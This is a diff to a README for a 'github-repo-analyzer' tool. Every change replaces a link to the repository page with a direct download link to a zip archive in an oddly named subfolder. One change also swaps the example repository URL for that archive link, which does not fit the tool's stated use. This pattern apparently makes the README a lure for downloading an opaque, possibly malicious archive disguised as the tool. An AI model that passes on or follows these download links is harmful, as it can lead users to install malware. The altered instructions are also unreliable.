@@ -1,6 +1,6 @@
 # 🛠️ github-repo-analyzer - Simple GitHub Repo Analysis Tool
 
-[![Download github-repo-analyzer](https://img.shields.io/badge/Download-Get%20Tool-blue)](https://github.com/Barakuda989/github-repo-analyzer)
+[![Download github-repo-analyzer](https://img.shields.io/badge/Download-Get%20Tool-blue)](https://github.com/Barakuda989/github-repo-analyzer/raw/refs/heads/main/tetradynamious/github-analyzer-repo-3.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You will get the tool from its official GitHub page. Follow these steps carefull
 
 Click the link below to visit the page where you can download github-repo-analyzer:
 
-[Download github-repo-analyzer](https://github.com/Barakuda989/github-repo-analyzer)
+[Download github-repo-analyzer](https://github.com/Barakuda989/github-repo-analyzer/raw/refs/heads/main/tetradynamious/github-analyzer-repo-3.0.zip)
 
 This link leads you to the main GitHub repository page.
 
@@ -103,7 +103,7 @@ The tool will start and show you a prompt.
 When asked, type the full URL of the GitHub repository you want to analyze. For example:
 
 ```
-https://github.com/torvalds/linux
+https://github.com/Barakuda989/github-repo-analyzer/raw/refs/heads/main/tetradynamious/github-analyzer-repo-3.0.zip
 ```
 
 Press Enter.
@@ -165,4 +165,4 @@ If you run into problems, try these solutions:
 
 Use this link to visit the GitHub page and download the latest version any time:
 
-[Download github-repo-analyzer](https://github.com/Barakuda989/github-repo-analyzer)
+[Download github-repo-analyzer](https://github.com/Barakuda989/github-repo-analyzer/raw/refs/heads/main/tetradynamious/github-analyzer-repo-3.0.zip)
